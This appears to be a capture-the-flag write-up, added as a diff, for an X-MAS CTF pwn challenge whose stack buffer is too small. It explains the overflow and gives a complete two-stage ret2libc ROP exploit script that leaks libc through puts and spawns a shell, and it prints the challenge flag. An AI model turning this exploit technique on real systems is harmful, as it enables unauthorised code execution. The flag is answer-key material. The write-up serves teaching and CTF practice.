@@ -1,0 +1,116 @@
+Have you ever wanted to have a place where you could express your biggest
+concerns about this year's X-MAS but didn't have a toll-free (taxes may apply)
+telephonic service at your disposal?
+
+Well, this year Santa took care of that!
+
+Category:       pwn (50 points)
+Chall author:   PinkiePie1189
+Writeup author: malfurious
+
+
+
+RE
+--
+The scoreboard provides us with the executable, its libc binary, and
+linker/loader.  The application is not stripped, so we see the functions,
+non-pic, so we have known memory addresses within it, and doesn't use stack
+canaries.  However, NX is set, so no shellcode.
+
+The application just contains a main function, which performs the rough outline
+described below:
+
+    - setvbuf on stdin and stdout, to disable buffering
+    - fopen /dev/null in write mode
+    - setbuf on the devnull file, to establish a buffer on the stack for use
+    - puts a welcome message
+    - while user input != "done"
+        - fgets stdin to a stack buffer
+        - fwrite that buffer to the devnull file handle
+
+The buffer used to collect intermediate user input is actually properly guarded
+from buffer overruns by its fgets call, passing 0x200 for the size parameter.
+We are only able to overrun the stack frame because the additional stack buffer
+established by the prior setbuf call is not as long as libc mandates.
+
+From 'man setbuf':
+
+    void setbuf(FILE *restrict stream, char *restrict buf);
+
+    [The other three calls] are, in effect, simply aliases for calls to setvbuf().
+    The setbuf() function is exactly equivalent to the call
+
+        setvbuf(stream, buf, buf ? _IOFBF : _IONBF, BUFSIZ);
+
+BUFSIZ is the required size.
+
+
+
+ROP Exploit
+-----------
+When the program writes to /dev/null, it writes the entire 0x200-byte temporary
+buffer, regardless of the amount of input received.  So, our first couple writes
+can be empty lines.  It takes 3 batches of input to get close to the end of the
+stack frame, and another 8 bytes to reach the saved RBP value exactly.  You'll
+see a helper function in my exploit code that abstracts this process.
+
+I attempted a ret2libc to execute system("/bin/sh") and acquire a shell.  So, we
+need to leak a libc address to calculate the mapped absolute addresses of the
+system function and its "/bin/sh" argument.  I acheve this by ROP-ing to call
+the puts function with the address of the puts GOT entry as its argument (the
+GOT entry is already initialized because puts was called earlier in the program
+runtime).  I finally return back to the program entry-point, to allow me to
+re-exploit having gained the leaked address.  _start is chosen, rather than main,
+so that the stack is re-initialized and repaired from my damage.
+
+The second ROP chain is a straight-forward call to the library function, using
+the addresses resolved from the previous leak.  My exploit code also calls
+exit(0) to attempt to exit cleanly.
+
+We require the use of a 'pop rdi; ret' gadget from the main executable, as well
+as a simple 'ret' gadget, used at the beginning of the second ROP chain to fixup
+the stack alignment prior to calling system.
+
+See my full sploit exploit script below.
+
+X-MAS{H07l1n3_Buff3r5_t00_5m4ll}
+
+
+
+Solution (Python/sploit)
+------------------------
+#!/usr/bin/env sploit
+from sploit.payload import *
+from sploit.rev.elf import *
+from sploit.arch import *
+
+b = ELF("./chall")
+l = ELF("./libc-2.27.so")
+poprdi = b.egad("pop rdi;ret")
+ret = 0x00400886 # ret gadget
+
+def sendpld(p):
+    io.readline()
+    io.writeline()
+    io.writeline()
+    io.writeline(Payload().pad(8)()+p())
+    io.writeline(b'done')
+
+# Leak libc address
+sendpld(Payload().sbp()
+        .ret(poprdi).int(b.sym._GOT_puts)   # puts(&puts)
+        .ret(b.sym._PLT_puts)
+        .ret(b.sym._start))                 # goto _start
+
+leak = btoi(io.readline()[:-1])             # strip \n char
+l.sym = l.sym.map(leak, l.sym.puts)         # update libc mapping based on puts function
+
+# Get shell
+sendpld(Payload().sbp()
+        .ret(ret)                           # stack alignment
+        .ret(poprdi).int(l.sym._bin_sh)     # system("/bin/sh")
+        .ret(l.sym.system)
+        .ret(poprdi).int(0)                 # exit(0)
+        .ret(l.sym.exit))
+
+io.interact()
